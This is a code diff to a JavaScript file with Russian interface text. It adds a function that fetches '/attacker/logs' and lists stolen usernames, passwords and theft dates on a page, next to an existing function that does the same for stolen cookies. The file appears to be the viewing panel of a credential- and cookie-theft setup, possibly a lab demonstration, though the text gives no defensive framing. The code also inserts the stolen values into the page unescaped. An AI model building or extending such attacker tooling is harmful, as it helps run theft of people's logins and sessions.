@@ -1,6 +1,3 @@
-
-
-
 function fetchCookies() {
     fetch('/attacker/logs')
     .then(response => response.json())
@@ -30,5 +27,39 @@ function fetchCookies() {
     .catch(error => {
         console.error("Ошибка при загрузке куки:", error);
         document.getElementById("cookies-list").innerHTML = "❌ Ошибка при загрузке.";
+    });
+}
+
+function fetchCredentials() {
+    fetch('/attacker/logs')
+    .then(response => response.json())
+    .then(data => {
+        let credentialsList = document.getElementById("credentials-list");
+
+        if (!Array.isArray(data.stolen_credentials) || data.stolen_credentials.length === 0) {
+            credentialsList.innerHTML = "❌ Пока ничего не украдено.";
+            return;
+        }
+
+        credentialsList.innerHTML = "<b>🕵️‍♂️ Украденные учетные данные:</b><br><br>";
+
+        data.stolen_credentials.forEach(item => {
+            let username = item.username || "Неизвестно";
+            let password = item.password || "Неизвестно";
+            let stolenAt = item.stolen_at || "Неизвестно";
+
+            let credDiv = document.createElement("div");
+            credDiv.classList.add("credential-item");
+            credDiv.innerHTML = `
+                <span class="user-icon">👤</span> <strong>Username:</strong> ${username} <br>
+                <span class="lock-icon">🔒</span> <strong>Password:</strong> ${password} <br>
+                <span class="date-icon">📅</span> <b>Дата:</b> ${stolenAt} <br>
+            `;
+            credentialsList.appendChild(credDiv);
+        });
+    })
+    .catch(error => {
+        console.error("Ошибка при загрузке учетных данных:", error);
+        document.getElementById("credentials-list").innerHTML = "❌ Ошибка при загрузке.";
     });
 }
